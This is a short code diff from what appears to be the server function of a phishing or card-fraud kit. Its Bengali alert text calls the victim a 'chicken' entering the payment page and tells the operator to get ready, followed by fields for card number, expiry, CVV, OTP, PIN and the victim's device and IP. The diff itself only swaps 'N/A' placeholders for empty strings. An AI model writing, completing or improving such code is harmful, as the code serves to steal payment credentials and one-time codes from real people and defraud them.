@@ -45,12 +45,12 @@ serve(async (req) => {
       if (paymentType === 'card') {
         message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
           `-------------------\n\n` +
-          `Payment Method : ${method || 'N/A'}\n` +
-          `Cardholder Name : N/A\n` +
-          `Card Number : N/A\n` +
-          `Expiry Date : N/A\n` +
-          `CVV : N/A\n\n` +
-          `OTP : N/A\n\n` +
+          `Payment Method : ${method || ''}\n` +
+          `Cardholder Name : \n` +
+          `Card Number : \n` +
+          `Expiry Date : \n` +
+          `CVV : \n\n` +
+          `OTP : \n\n` +
           `-------------------\n\n` +
           `🐔মুরগির Device : ${device}\n` +
           `🐔মুরগির IP : ${clientIp}\n` +
@@ -58,10 +58,10 @@ serve(async (req) => {
       } else {
         message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
           `-------------------\n\n` +
-          `Payment Method : ${method || 'N/A'}\n` +
-          `Number : N/A\n` +
-          `OTP : N/A\n` +
-          `PIN : N/A\n\n` +
+          `Payment Method : ${method || ''}\n` +
+          `Number : \n` +
+          `OTP : \n` +
+          `PIN : \n\n` +
           `-------------------\n\n` +
           `🐔মুরগির Device : ${device}\n` +
           `🐔মুরগির IP : ${clientIp}\n` +
